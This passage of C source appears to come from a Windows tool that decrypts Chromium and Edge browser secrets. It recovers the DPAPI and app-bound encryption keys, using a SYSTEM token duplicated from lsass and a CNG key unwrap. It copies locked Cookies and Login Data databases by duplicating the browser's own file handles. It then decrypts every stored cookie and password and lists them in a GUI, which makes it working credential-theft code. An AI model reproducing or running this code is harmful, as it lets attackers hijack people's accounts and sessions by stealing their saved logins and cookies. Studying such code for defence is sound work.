                      sizeof(BCRYPT_CHAIN_MODE_GCM),
                      0);
    St = BCryptGetProperty(Alg,
                           BCRYPT_OBJECT_LENGTH,
                           (PUCHAR)&ObjLen,
                           sizeof(ObjLen),
                           &Done,
                           0);
    if (!NT_SUCCESS(St) || ObjLen > sizeof(Object))
    {
        BCryptCloseAlgorithmProvider(Alg, 0);
        return FALSE;
    }
    St = BCryptGenerateSymmetricKey(Alg,
                                    &Cipher,
                                    Object,
                                    ObjLen,
                                    (PUCHAR)Key,
                                    32,
                                    0);
    if (NT_SUCCESS(St))
    {
        BCRYPT_INIT_AUTH_MODE_INFO(Auth);
        Auth.pbNonce = (PUCHAR)Nonce;
        Auth.cbNonce = 12;
        Auth.pbTag = (PUCHAR)Tag;
        Auth.cbTag = 16;
        St = BCryptDecrypt(Cipher,
                           (PUCHAR)CipherText,
                           Length,
                           &Auth,
                           NULL,
                           0,
                           Plain,
                           Length,
                           &Result,
                           0);
    }
    if (Cipher) BCryptDestroyKey(Cipher);
    BCryptCloseAlgorithmProvider(Alg, 0);
    return NT_SUCCESS(St);
}

/* v10/v11/v20 column values: "vXX" + nonce[12] + ciphertext + tag[16] */
static BOOL
AbeGcmDecrypt(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ DWORD Length,
    _Out_writes_bytes_(Length) PBYTE Plain)
{
    if (Length <= 3 + 12 + 16) return FALSE;
    return AbeAesGcmOpen(Key,
                         Value + 3,
                         Value + 15,
                         Length - 3 - 12 - 16,
                         Value + Length - 16,
                         Plain);
}

/*** method: Elevate (admin: SYSTEM + user DPAPI layers, then V3 envelope) ***/

/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
   SYSTEM profile's Microsoft Software KSP store) */
static BOOL
AbeV3Unwrap(
    _In_ const ABE_BROWSER* Browser,
    _In_reads_bytes_(ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NCRYPT_PROV_HANDLE Provider = 0;
    NCRYPT_KEY_HANDLE CngKey = 0;
    BYTE Derived[ABE_KEY_SIZE];
    DWORD Length = 0;
    SECURITY_STATUS St;
    BOOL Ok;
    ULONG i;

    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
    if (FAILED(St))
    {
        AbeLog(L"V3：NCryptOpenStorageProvider 失败，0x%08lX\r\n", (unsigned long)St);
        return FALSE;
    }
    St = NCryptOpenKey(Provider, &CngKey, Browser->CngKey, 0, 0);
    if (FAILED(St))
    {
        AbeLog(L"V3：NCryptOpenKey(%ls) 失败，0x%08lX\r\n", Browser->CngKey, (unsigned long)St);
        NCryptFreeObject(Provider);
        return FALSE;
    }

    /* raw 32->32 decrypt, as done by the browsers' elevation service and ChatGPT's importer */
    St = NCryptDecrypt(CngKey,
                       (PBYTE)Envelope + 1,
                       ABE_KEY_SIZE,
                       NULL,
                       Derived,
                       sizeof(Derived),
                       &Length,
                       NCRYPT_SILENT_FLAG);
    NCryptFreeObject(CngKey);
    NCryptFreeObject(Provider);
    if (FAILED(St) || Length != ABE_KEY_SIZE)
    {
        AbeLog(L"V3：NCryptDecrypt 失败，0x%08lX (len=%lu)\r\n", (unsigned long)St, Length);
        return FALSE;
    }

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Derived[i] ^= AbeV3Mask[i];
    }
    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
    Ok = AbeAesGcmOpen(Derived,
                       Envelope + 33,
                       Envelope + 45,
                       ABE_KEY_SIZE,
                       Envelope + 77,
                       Key);
    RtlSecureZeroMemory(Derived, sizeof(Derived));
    if (!Ok)
    {
        AbeLog(L"V3：AES-256-GCM 校验失败（tag 错误？）\r\n");
    }
    return Ok;
}

static BOOL
AbeGetKeyElevate(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ const ABE_BROWSER* Entry,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    static BYTE Blob[4096];
    DATA_BLOB In, Out = { 0 };
    DWORD BlobLength = sizeof(Blob);
    ULONG LsaProcessId;
    HANDLE SystemToken = NULL;
    NTSTATUS Status;
    BOOL Ok = FALSE;

    if (!AbeReadOsCryptBlob(Browser->UserDataDir,
                            L"app_bound_encrypted_key",
                            Blob,
                            sizeof(Blob),
                            &BlobLength) ||
        BlobLength <= 4 || memcmp(Blob, "APPB", 4) != 0)
    {
        AbeLog(L"Elevate：读取 app_bound_encrypted_key 失败\r\n");
        return FALSE;
    }

    /* duplicate the SYSTEM impersonation token from lsass (admin needed) */
    Status = Sys_GetLsaProcessId(&LsaProcessId);
    if (NT_SUCCESS(Status))
    {
        Status = PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken);
    }
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"Elevate：无法获取 SYSTEM 令牌，0x%08lX（需要管理员）\r\n", Status);
        return FALSE;
    }

    /* layer 1: SYSTEM DPAPI */
    In.pbData = Blob + 4;
    In.cbData = BlobLength - 4;
    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
    {
        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
        {
            PS_Impersonate(NULL);
            NtClose(SystemToken);
            AbeLog(L"Elevate：SYSTEM DPAPI 解密失败，gle=%lu\r\n", GetLastError());
            return FALSE;
        }
        PS_Impersonate(NULL);
    }
    else
    {
        NtClose(SystemToken);
        AbeLog(L"Elevate：模拟 SYSTEM 失败，0x%08lX\r\n", Status);
        return FALSE;
    }

    /* layer 2: user DPAPI, then unwrap the innermost structure */
    {
        DATA_BLOB Final = { 0 };
        DWORD ValidationLength, PayloadLength;
        const BYTE* Payload;
        BOOL Parsed = FALSE;

        In.pbData = Out.pbData;
        In.cbData = Out.cbData;
        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
        {
            LocalFree(Out.pbData);
            NtClose(SystemToken);
            AbeLog(L"Elevate：用户 DPAPI 解密失败，gle=%lu\r\n", GetLastError());
            return FALSE;
        }
        LocalFree(Out.pbData);

        /* innermost: [u32 len][validation data][u32 len][payload]
           (Edge payload: raw key; Chrome V3: private envelope) */
        if (Final.cbData >= 8)
        {
            RtlCopyMemory(&ValidationLength, Final.pbData, sizeof(ValidationLength));
            RtlCopyMemory(&PayloadLength,
                          Final.pbData + 4 + ValidationLength,
                          sizeof(PayloadLength));
            Payload = Final.pbData + 8 + ValidationLength;
            if ((ULONGLONG)(Payload - Final.pbData) + PayloadLength == Final.cbData)
            {
                Parsed = TRUE;

                if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
                {
                    /* V3: the CNG unwrap must run as SYSTEM */
                    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
                    {
                        Ok = AbeV3Unwrap(Entry, Payload, Key);
                        PS_Impersonate(NULL);
                    }
                }
                else if (PayloadLength == ABE_KEY_SIZE)
                {
                    RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
                    Ok = TRUE;
                }
                else
                {
                    AbeLog(L"Elevate：不支持的 payload（%lu 字节）\r\n", PayloadLength);
                }
            }
        }
        if (!Parsed)
        {
            AbeLog(L"Elevate：内层数据格式异常（%lu 字节）\r\n", Final.cbData);
        }
        RtlSecureZeroMemory(Final.pbData, Final.cbData);
        LocalFree(Final.pbData);
    }
    NtClose(SystemToken);
    return Ok;
}

/*** v10 key (DPAPI, always works) ***/

static BOOL
AbeGetV10Key(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    static BYTE Blob[2048];
    DWORD BlobLength = sizeof(Blob);
    DATA_BLOB In, Out = { 0 };
    BOOL Ok = FALSE;

    if (!AbeReadOsCryptBlob(Browser->UserDataDir,
                            L"encrypted_key",
                            Blob,
                            sizeof(Blob),
                            &BlobLength) ||
        BlobLength <= 5 || memcmp(Blob, "DPAPI", 5) != 0)
    {
        return FALSE;
    }
    In.pbData = Blob + 5;
    In.cbData = BlobLength - 5;
    Ok = CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out) &&
         Out.cbData == ABE_KEY_SIZE;
    if (Ok)
    {
        RtlCopyMemory(Key, Out.pbData, ABE_KEY_SIZE);
        RtlSecureZeroMemory(Out.pbData, Out.cbData);
    }
    LocalFree(Out.pbData);
    return Ok;
}

/*** SQLite ***/

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int (*SQLITE_OPEN)(const char*, sqlite3**, int, const char*);
typedef int (*SQLITE_CLOSE)(sqlite3*);
typedef int (*SQLITE_PREPARE)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*SQLITE_STEP)(sqlite3_stmt*);
typedef int (*SQLITE_FINALIZE)(sqlite3_stmt*);
typedef const unsigned char* (*SQLITE_COL_TEXT)(sqlite3_stmt*, int);
typedef const void* (*SQLITE_COL_BLOB)(sqlite3_stmt*, int);
typedef int (*SQLITE_COL_BYTES)(sqlite3_stmt*, int);
typedef int (*SQLITE_DESERIALIZE)(sqlite3*, const char*, unsigned char*,
                                  sqlite3_int64,
                                  sqlite3_int64,
                                  unsigned);

static struct
{
    HMODULE Mod;
    SQLITE_OPEN Open;
    SQLITE_CLOSE Close;
    SQLITE_PREPARE Prepare;
    SQLITE_STEP Step;
    SQLITE_FINALIZE Finalize;
    SQLITE_COL_TEXT ColText;
    SQLITE_COL_BLOB ColBlob;
    SQLITE_COL_BYTES ColBytes;
    SQLITE_DESERIALIZE Deserialize;
} Sq;

static BOOL
AbeLoadSqlite(VOID)
{
    Sq.Mod = LoadLibraryExW(L"winsqlite3.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (Sq.Mod == NULL) return FALSE;
    Sq.Open = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_open_v2");
    Sq.Close = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_close");
    Sq.Prepare = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_prepare_v2");
    Sq.Step = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_step");
    Sq.Finalize = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_finalize");
    Sq.ColText = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_text");
    Sq.ColBlob = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_blob");
    Sq.ColBytes = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_bytes");
    Sq.Deserialize = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_deserialize");
    return Sq.Open && Sq.Close && Sq.Prepare && Sq.Step && Sq.Finalize &&
           Sq.ColText && Sq.ColBlob && Sq.ColBytes;
}

static PCSTR
AbePathToUri(
    _In_ PCWSTR Path,
    _In_ BOOL Immutable)
{
    static CHAR Uri[MAX_PATH * 3];
    CHAR Utf8[MAX_PATH * 3];
    ULONG i;
    PSTR Out;

    if (Str_W2U(Utf8, Path) == 0) return NULL;
    Out = Uri;
    Str_PrintfExA(Uri, ARRAYSIZE(Uri), "file:");
    Out = Uri + strlen(Uri);
    for (i = 0; i < (ULONG)(Str_SizeA(Utf8) / sizeof(CHAR)); i++)
    {
        *Out++ = Utf8[i] == '\\' ? '/' : Utf8[i];
    }
    *Out = 0;
    Str_PrintfExA(Out,
                  ARRAYSIZE(Uri) - (DWORD)(Out - Uri),
                  Immutable ? "?immutable=1" : "?mode=ro&nolock=1");
    return Uri;
}

/*** locked database: map the browser's own handle via FileProcessIdsUsingFileInformation ***/

static BOOL
AbeReadLockedDb(
    _In_ PCWSTR DbPath,
    _Outptr_result_bytebuffer_(*Size) PBYTE* Buffer,
    _Out_ PULONG Size)
{
    PFILE_PROCESS_IDS_USING_FILE_INFORMATION Owners = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles = NULL;
    FILE_NAME_INFORMATION* OwnName = NULL;
    IO_STATUS_BLOCK IoStatusBlock;
    HANDLE File = NULL, Process = NULL, Dup = NULL;
    ULONGLONG FileSize;
    IO_FILE_MAP Map;
    ULONG Length, Required, i, j;
    NTSTATUS Status;
    BOOL Ok = FALSE;

    *Buffer = NULL;
    *Size = 0;

    /* an attributes-only open succeeds even while the browser holds the DB busy */
    Status = IO_OpenWin32File(&File,
                              DbPath,
                              NULL,
                              FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        return FALSE;
    }

    /* our own volume-relative name, used to match the browser's handles */
    OwnName = Mem_Alloc(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR));
    if (OwnName == NULL) goto Cleanup;
    Status = NtQueryInformationFile(File,
                                    &IoStatusBlock,
                                    OwnName,
                                    (ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)),
                                    FileNameInformation);
    if (!NT_SUCCESS(Status)) goto Cleanup;

    /* who is holding this file? */
    Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
             16 * sizeof(HANDLE);
    for (;;)
    {
        Owners = Mem_ReAlloc(Owners, Length);
        if (Owners == NULL) goto Cleanup;
        Status = NtQueryInformationFile(File,
                                        &IoStatusBlock,
                                        Owners,
                                        Length,
                                        FileProcessIdsUsingFileInformation);
        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
            Status != STATUS_BUFFER_TOO_SMALL)
        {
            break;
        }
        Length *= 2;
        if (Length > 1 << 20) goto Cleanup;
    }
    if (!NT_SUCCESS(Status)) goto Cleanup;

    /* duplicate a matching handle from each owner (no system-wide enumeration) */
    for (i = 0; i < Owners->NumberOfProcessIdsInList && !Ok; i++)
    {
        if (!NT_SUCCESS(PS_OpenProcess(&Process, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                       (ULONG)(ULONG_PTR)Owners->ProcessIdList[i])))
        {
            continue;
        }
        Length = 64 * 1024;
        Handles = NULL;
        for (;;)
        {
            Handles = Mem_ReAlloc(Handles, Length);
            if (Handles == NULL) break;
            Status = NtQueryInformationProcess(Process,
                                               ProcessHandleInformation,
                                               Handles,
                                               Length,
                                               &Required);
            if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
                Status != STATUS_BUFFER_TOO_SMALL)
            {
                break;
            }
            Length = max(Length * 2, Required + 4096);
            if (Length > 64 * 1024 * 1024) break;
        }
        if (Handles == NULL || !NT_SUCCESS(Status))
        {
            Mem_Free(Handles);
            Handles = NULL;
            NtClose(Process);
            Process = NULL;
            continue;
        }

        for (j = 0; j < Handles->NumberOfHandles && !Ok; j++)
        {
            FILE_NAME_INFORMATION* Name;

            if (!NT_SUCCESS(NtDuplicateObject(Process,
                                              Handles->Handles[j].HandleValue,
                                              NtCurrentProcess(),
                                              &Dup,
                                              0,
                                              0,
                                              DUPLICATE_SAME_ACCESS)))
            {
                continue;
            }
            /* non-file handles fail this query instantly (no hang) */
            Name = Mem_Alloc(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR));
            if (Name != NULL &&
                NT_SUCCESS(NtQueryInformationFile(Dup, &IoStatusBlock, Name,
                                                  (ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)),
                                                  FileNameInformation)) &&
                Name->FileNameLength == OwnName->FileNameLength)
            {
                UNICODE_STRING A, B;

                A.Length = A.MaximumLength = (USHORT)OwnName->FileNameLength;
                A.Buffer = OwnName->FileName;
                B.Length = B.MaximumLength = (USHORT)Name->FileNameLength;
                B.Buffer = Name->FileName;
                if (RtlEqualUnicodeString(&A, &B, TRUE) &&
                    NT_SUCCESS(IO_GetFileSize(Dup, &FileSize)) &&
                    FileSize > 0 && FileSize < 64 * 1024 * 1024 &&
                    NT_SUCCESS(IO_MapReadOnlyFile(Dup, &Map)))
                {
                    *Buffer = Mem_Alloc((SIZE_T)FileSize);
                    if (*Buffer != NULL)
                    {
                        RtlCopyMemory(*Buffer, Map.BaseAddress, (SIZE_T)FileSize);
                        *Size = (ULONG)FileSize;
                        Ok = TRUE;
                    }
                    IO_UnmapFile(&Map);
                }
            }
            Mem_Free(Name);
            NtClose(Dup);
            Dup = NULL;
        }
        Mem_Free(Handles);
        Handles = NULL;
        NtClose(Process);
        Process = NULL;
    }

Cleanup:
    if (Dup != NULL) NtClose(Dup);
    if (Process != NULL) NtClose(Process);
    Mem_Free(Handles);
    Mem_Free(Owners);
    Mem_Free(OwnName);
    NtClose(File);
    return Ok;
}

/*** record collection ***/

static BOOL
AbeAppendRecord(
    _Inout_ PABE_RECORD* Array,
    _Inout_ PULONG Count,
    _Inout_ PULONG Capacity)
{
    if (*Count == *Capacity)
    {
        PABE_RECORD NewArray;

        *Capacity = *Capacity != 0 ? *Capacity * 2 : 64;
        NewArray = Mem_ReAlloc(*Array, *Capacity * sizeof(**Array));
        if (NewArray == NULL) return FALSE;
        *Array = NewArray;
    }
    RtlZeroMemory(&(*Array)[*Count], sizeof(**Array));
    (*Count)++;
    return TRUE;
}

static VOID
AbeCollectRecords(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_z_ PCWSTR Profile,
    _In_ BOOL IsCookie,
    _In_reads_bytes_(32) const BYTE* V10Key,
    _In_reads_bytes_opt_(32) const BYTE* V20Key,
    _Inout_ PABE_RESULT Result)
{
    static const CHAR CookieSql[] =
        "SELECT host_key,name,encrypted_value FROM cookies";
    static const CHAR PasswordSql[] =
        "SELECT origin_url,username_value,password_value FROM logins";
    PABE_RECORD* Records = IsCookie ? &Result->Cookies : &Result->Passwords;
    PULONG RecordCount = IsCookie ? &Result->CookieCount : &Result->PasswordCount;
    ULONG Capacity = 0;
    WCHAR Base[MAX_PATH], DbPath[MAX_PATH];
    sqlite3* Db = NULL;
    sqlite3_stmt* St = NULL;
    static BYTE Plain[4096];
    const BYTE* Blob;
    const char *Site, *Name;
    DWORD Length, Skip;
    int ResultCode;
    UNICODE_STRING Value;
    static UNICODE_STRING LocalAppData = RTL_CONSTANT_STRING(L"LOCALAPPDATA");

    Value.Length = 0;
    Value.MaximumLength = sizeof(Base);
    Value.Buffer = Base;
    if (!NT_SUCCESS(RtlQueryEnvironmentVariable_U(NULL, &LocalAppData, &Value)))
    {
        return;
    }
    Base[Value.Length / sizeof(WCHAR)] = UNICODE_NULL;
    Str_PrintfExW(DbPath,
                  MAX_PATH,
                  L"%ls\\%ls\\User Data\\%ls\\%hs",
                  Base,
                  Browser->Vendor,
                  Profile,
                  IsCookie ? "Network\\Cookies" : "Login Data");

    /* try: mode=ro&nolock=1 → immutable → DuplicateHandle + deserialize.
       SQLite opens lazily: lock conflicts surface at prepare time, so each
       tier must be validated by prepare, not just the open call. */
    {
        PCSTR Sql = IsCookie ? CookieSql : PasswordSql;

        ResultCode = Sq.Open(AbePathToUri(DbPath, FALSE), &Db, 0x41, NULL);
        if (ResultCode == 0) ResultCode = Sq.Prepare(Db, Sql, -1, &St, NULL);
        if (ResultCode != 0)
        {
            if (St) Sq.Finalize(St);
            if (Db) Sq.Close(Db);
            St = NULL;
            Db = NULL;
            ResultCode = Sq.Open(AbePathToUri(DbPath, TRUE), &Db, 0x41, NULL);
            if (ResultCode == 0) ResultCode = Sq.Prepare(Db, Sql, -1, &St, NULL);
        }
        if (ResultCode != 0 && Sq.Deserialize != NULL)
        {
            PBYTE RawDb = NULL;
            ULONG RawSize = 0;

            if (St) Sq.Finalize(St);
            if (Db) Sq.Close(Db);
            St = NULL;
            Db = NULL;
            if (AbeReadLockedDb(DbPath, &RawDb, &RawSize))
            {
                ResultCode = Sq.Open(":memory:", &Db, 0x02 | 0x04, NULL);
                if (ResultCode == 0)
                {
                    ResultCode = Sq.Deserialize(Db,
                                                "main",
                                                RawDb,
                                                (sqlite3_int64)RawSize,
                                                (sqlite3_int64)RawSize,
                                                0x01 /* READONLY */);
                    if (ResultCode == 0) ResultCode = Sq.Prepare(Db, Sql, -1, &St, NULL);
                }
                if (ResultCode != 0 && Db)
                {
                    Sq.Close(Db);
                    Db = NULL;
                }
            }
        }
    }
    if (ResultCode != 0 || St == NULL)
    {
        AbeLog(L"%ls：数据库不可用（%d）\r\n",
               IsCookie ? L"Cookies" : L"密码库",
               ResultCode);
        return;
    }

    while (Sq.Step(St) == 100 /* SQLITE_ROW */)
    {
        PABE_RECORD Record;
        PCSTR Ver;
        const BYTE* Key = NULL;

        Site = (const char*)Sq.ColText(St, 0);
        Name = (const char*)Sq.ColText(St, 1);
        Blob = (const BYTE*)Sq.ColBlob(St, 2);
        Length = (DWORD)Sq.ColBytes(St, 2);
        if (!Site || !Name || !Blob || Length <= 31) continue;

        /* determine version prefix and pick the key */
        Ver = memcmp(Blob, "v20", 3) == 0 ? "v20" :
              memcmp(Blob, "v10", 3) == 0 ? "v10" :
              memcmp(Blob, "v11", 3) == 0 ? "v11" : "???";

        if (memcmp(Blob, "v20", 3) == 0 && V20Key) Key = V20Key;
        else if ((memcmp(Blob, "v10", 3) == 0 || memcmp(Blob, "v11", 3) == 0) && V10Key) Key = V10Key;
        if (!Key || !AbeGcmDecrypt(Key, Blob, Length, Plain)) continue;
        Skip = IsCookie && Length > 3 + 12 + 16 + 32 ? 32 : 0;

        if (!AbeAppendRecord(Records, RecordCount, &Capacity)) break;
        Record = &(*Records)[*RecordCount - 1];
        Str_A2W(Record->Version, Ver);
        Str_U2W(Record->Site, Site);
        Str_U2W(Record->Name, Name);
        MultiByteToWideChar(CP_UTF8,
                            0,
                            (PCCH)Plain + Skip,
                            (int)(Length - 31 - Skip),
                            Record->Value,
                            (int)ARRAYSIZE(Record->Value) - 1);
    }
    Sq.Finalize(St);
    Sq.Close(Db);
}

/*** worker thread ***/

typedef struct _ABE_JOB
{
    NET_BROWSER_INFO Browser;
    ABE_BROWSER Entry;
    ULONG BrowserIndex;
    ABE_METHOD Method;
    WCHAR Profile[MAX_PATH];
} ABE_JOB, *PABE_JOB;

static DWORD WINAPI
AbeWorker(
    _In_ LPVOID Parameter)
{
    PABE_JOB Job = Parameter;
    PABE_RESULT Result;
    BYTE V10Key[ABE_KEY_SIZE], V20Key[ABE_KEY_SIZE];
    BOOL HaveV10, HaveV20 = FALSE;
    ULONG i;

    Result = Mem_Alloc(sizeof(*Result));
    if (Result == NULL)
    {
        Mem_Free(Job);
        return 0;
    }
    RtlZeroMemory(Result, sizeof(*Result));
    g_Log[0] = UNICODE_NULL;
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    HaveV10 = AbeGetV10Key(&Job->Browser, V10Key);
    AbeLog(L"v10 密钥（DPAPI）：%ls\r\n", HaveV10 ? L"成功" : L"失败");

    switch (Job->Method)
    {
        case MethodDrop:
            HaveV20 = AbeGetKeyDrop(&Job->Browser, Job->BrowserIndex, V20Key);
            break;
        case MethodInject:
            HaveV20 = AbeGetKeyInject(&Job->Browser, Job->BrowserIndex, V20Key);
            break;
        case MethodElevate:
            HaveV20 = AbeGetKeyElevate(&Job->Browser, &Job->Entry, V20Key);
            break;
        default:
            HaveV20 = AbeGetKeyHijack(&Job->Browser, Job->BrowserIndex, V20Key);
            break;
    }
    AbeLog(L"v20 密钥（%ls）：%ls\r\n",
           AbeMethodNames[Job->Method],
           HaveV20 ? L"成功" : L"失败");
    if (HaveV10)
    {
        AbeLog(L"!!! V10 KEY: ");
        for (i = 0; i < ABE_KEY_SIZE; i++) AbeLog(L"%02X", V10Key[i]);
        AbeLog(L" !!!\r\n");
    }
    if (HaveV20)
    {
        AbeLog(L"!!! V20 KEY: ");
        for (i = 0; i < ABE_KEY_SIZE; i++) AbeLog(L"%02X", V20Key[i]);
        AbeLog(L" !!!\r\n");
    }

    if (HaveV10 || HaveV20)
    {
        if (AbeLoadSqlite())
        {
            AbeCollectRecords(&Job->Browser,
                              Job->Profile,
                              TRUE,
                              HaveV10 ? V10Key : NULL,
                              HaveV20 ? V20Key : NULL,
                              Result);
            AbeCollectRecords(&Job->Browser,
                              Job->Profile,
                              FALSE,
                              HaveV10 ? V10Key : NULL,
                              HaveV20 ? V20Key : NULL,
                              Result);
        }
        else
        {
            AbeLog(L"winsqlite3.dll 不可用\r\n");
        }
    }

    Result->Ok = HaveV20 || HaveV10;
    Str_CopyExW(Result->Status, ARRAYSIZE(Result->Status), g_Log);
    if (Result->Ok)
    {
        Str_CatExW(Result->Status,
                   ARRAYSIZE(Result->Status),
                   L"\r\n成功：Cookies 记录数 ");
        {
            WCHAR Number[16];

            Str_PrintfExW(Number, ARRAYSIZE(Number), L"%lu", Result->CookieCount);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Number);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), L"，密码记录数 ");
            Str_PrintfExW(Number, ARRAYSIZE(Number), L"%lu", Result->PasswordCount);
            Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Number);
        }
    }

    RtlSecureZeroMemory(V10Key, sizeof(V10Key));
    if (HaveV20) RtlSecureZeroMemory(V20Key, sizeof(V20Key));
    CoUninitialize();
    PostMessageW(g_MainWindow, WM_APP + 1, 0, (LPARAM)Result);
    Mem_Free(Job);
    return 0;
}

/*** GUI helpers ***/

static INT
AbeScale(
    _In_ INT Value)
{
    return MulDiv(Value, g_Dpi, USER_DEFAULT_SCREEN_DPI);
}

static HWND
AbeCreateControl(
    _In_z_ PCWSTR Class,
    _In_opt_z_ PCWSTR Text,
    _In_ DWORD Style,
    _In_ DWORD ExStyle,
    _In_ INT x,
    _In_ INT y,
    _In_ INT w,
    _In_ INT h,
    _In_ INT Id)
{
    HWND Control = CreateWindowExW(ExStyle,
                                   Class,
                                   Text,
                                   Style | WS_CHILD | WS_VISIBLE,
                                   x,
                                   y,
                                   w,
                                   h,
                                   g_MainWindow,
                                   (HMENU)(INT_PTR)Id,
                                   GetModuleHandleW(NULL),
                                   NULL);

    if (Control != NULL)
    {
        UI_SetWindowFont(Control, g_Font, FALSE);
    }
    return Control;
}

static HWND
AbeCreateList(
    _In_ INT Id,
    _In_z_ const PCWSTR* Columns,
    _In_reads_z_(16) const INT* Widths,
    _In_ INT x,
    _In_ INT y,
    _In_ INT w,
    _In_ INT h)
{
    HWND List;
    INT i;

    List = AbeCreateControl(WC_LISTVIEWW,
                            NULL,
                            WS_BORDER | WS_TABSTOP | LVS_REPORT | LVS_SHOWSELALWAYS,
                            WS_EX_CLIENTEDGE,
                            x,
                            y,
                            w,
                            h,
                            Id);
    if (List == NULL) return NULL;

    UI_SetWindowExplorerVisualStyle(List);
    SendMessageW(List,
                 LVM_SETEXTENDEDLISTVIEWSTYLE,
                 0,
                 LVS_EX_FULLROWSELECT | LVS_EX_LABELTIP | LVS_EX_DOUBLEBUFFER);
    for (i = 0; Columns[i] != NULL; i++)
    {
        LVCOLUMNW Column;

        RtlZeroMemory(&Column, sizeof(Column));
        Column.mask = LVCF_TEXT | LVCF_WIDTH;
        Column.pszText = (PWSTR)Columns[i];
        Column.cx = AbeScale(Widths[i]);
        SendMessageW(List, LVM_INSERTCOLUMNW, i, (LPARAM)&Column);
    }
    return List;
}

static VOID
AbeFillList(
    _In_ HWND List,
    _In_reads_opt_(Count) const ABE_RECORD* Records,
    _In_ ULONG Count)
{
    ULONG i;
    INT iItem;

    SendMessageW(List, WM_SETREDRAW, FALSE, 0);
    SendMessageW(List, LVM_DELETEALLITEMS, 0, 0);
    for (i = 0; i < Count; i++)
    {
        LVITEMW Item;

        RtlZeroMemory(&Item, sizeof(Item));
        Item.mask = LVIF_TEXT;
        Item.iItem = (INT)SendMessageW(List, LVM_GETITEMCOUNT, 0, 0);
        Item.pszText = (PWSTR)Records[i].Version;
        iItem = (INT)SendMessageW(List, LVM_INSERTITEMW, 0, (LPARAM)&Item);

        Item.iItem = iItem;
        Item.iSubItem = 1;
        Item.pszText = (PWSTR)Records[i].Site;
        SendMessageW(List, LVM_SETITEMW, 0, (LPARAM)&Item);
        Item.iSubItem = 2;
        Item.pszText = (PWSTR)Records[i].Name;
        SendMessageW(List, LVM_SETITEMW, 0, (LPARAM)&Item);
        Item.iSubItem = 3;
        Item.pszText = (PWSTR)Records[i].Value;
        SendMessageW(List, LVM_SETITEMW, 0, (LPARAM)&Item);
    }
    SendMessageW(List, WM_SETREDRAW, TRUE, 0);
    InvalidateRect(List, NULL, TRUE);
}

/* clears the cookies and passwords lists (selection changed on top) */
static VOID
AbeClearLists(VOID)
{
    SendMessageW(GetDlgItem(g_MainWindow, IDC_COOKIE_LIST), LVM_DELETEALLITEMS, 0, 0);
    SendMessageW(GetDlgItem(g_MainWindow, IDC_PASSWORD_LIST), LVM_DELETEALLITEMS, 0, 0);
}

static VOID
AbeLoadProfiles(
    _In_ const NET_BROWSER_INFO* Browser)
{
    HWND Combo = GetDlgItem(g_MainWindow, IDC_PROFILE_COMBO);
    NTSTATUS Status;
    ULONG i;
    INT Index;

    SendMessageW(Combo, CB_RESETCONTENT, 0, 0);
    Mem_Free(g_Profiles);
    g_Profiles = NULL;
    g_ProfileCount = 0;

    Status = Net_BrowserEnumerateProfiles(Browser->UserDataDir, &g_Profiles, &g_ProfileCount);
    if (!NT_SUCCESS(Status))
    {
        g_ProfileCount = 0;
    }
    for (i = 0; i < g_ProfileCount; i++)
    {
        Index = (INT)SendMessageW(Combo, CB_ADDSTRING, 0, (LPARAM)g_Profiles[i].Name);
        SendMessageW(Combo, CB_SETITEMDATA, Index, (LPARAM)&g_Profiles[i]);
    }
    SendMessageW(Combo, CB_SETCURSEL, 0, 0);
}

